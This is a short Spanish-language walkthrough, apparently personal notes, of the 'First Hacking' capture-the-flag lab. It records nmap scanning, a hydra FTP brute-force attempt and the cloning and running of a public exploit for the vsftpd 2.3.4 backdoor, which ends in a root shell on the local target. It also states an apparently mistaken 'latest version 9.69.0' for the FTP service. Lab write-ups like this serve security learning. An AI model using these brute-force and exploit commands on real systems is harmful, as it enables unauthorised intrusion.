- Tags: #FirstHacking
---
- [Maquina First Hacking](https://mega.nz/file/oCd2VC5D#QfiRoFmZrZ-FjTuyRX9bLw7638fjluwp6jNth7JjXTw) ==> Enlace de descarga al laboratorio. Lo descomprimimos y procedemos a desplegar el laboratorio.
```bash
7z x firsthacking.zip
sudo bash auto_deploy.sh firsthacking.tar  
```
---
- #### Fase Reconocimiento:
- **( 172.17.0.2 )** ==> Direccion ip del **target**.
```bash
 ping -c 1 172.17.0.2 # Realizamos una traza ICMP para ver si tenemos comunicacion con el target
 
 wichSystem.py 172.17.0.2 # Gracias al ttl podemor determinar que estamos ante una maquina linux
172.17.0.2 (ttl -> 64): Linux
```
---

- #### Fase Reconocimiento Puertos:
```bash
nmap -p- -sS --open --min-rate 5000 -vvv -n -Pn 172.17.0.2 -oG allPorts  # Realizamos descubrimiento de puertos
extractPorts allPorts # Usamos nuestra utilidad para parsear la informacion mas importante.
nmap -sC -sV -p21 172.17.0.2 -oN targeted  # Realizamos un escaneo exhaustivo para determinar el servicio y la version que corren detras de este servicio.
```
----
- **( 21/tcp open  ftp     vsftpd 2.3.4 )** ==> Tenemos un servicio **ftp** expuesto donde la version mas reciente es la: **( 9.69.0 )**
```bash
ftp 172.17.0.2 --> Probramos con el usuario ( anonymous ) pero esta deshabilitado.

hydra -L /usr/share/SecLists/Usernames/top-usernames-shortlist.txt -P /usr/share/wordlists/rockyou.txt -t 5 ftp://172.17.0.2  # Probamos con esta herramienta no obtuvimos resultados.
```
---
- Una vez ya conozcamos la versión del ftp podemos buscar por ella en Internet en búsquedad de algún exploit de esta forma `ftp vsftpd 2.3.4 exploit github`. 
- Nos encontramos con este repositorio de [github](https://github.com/Hellsender01/vsftpd_2.3.4_Exploit). Si seguimos las instrucciones del repositorio instalando los requirimientos con `sudo python3 -m pip install pwntools`.  
- Nos descargamos el repositorio con `git clone https://github.com/Hellsender01/vsftpd_2.3.4_Exploit.git`. Una vez esté descargado probamos ha hacer lo que nos dice que sería `python3 exploit.py 172.17.0.2`.
- **Nota** ==> Ahora estamos como **root**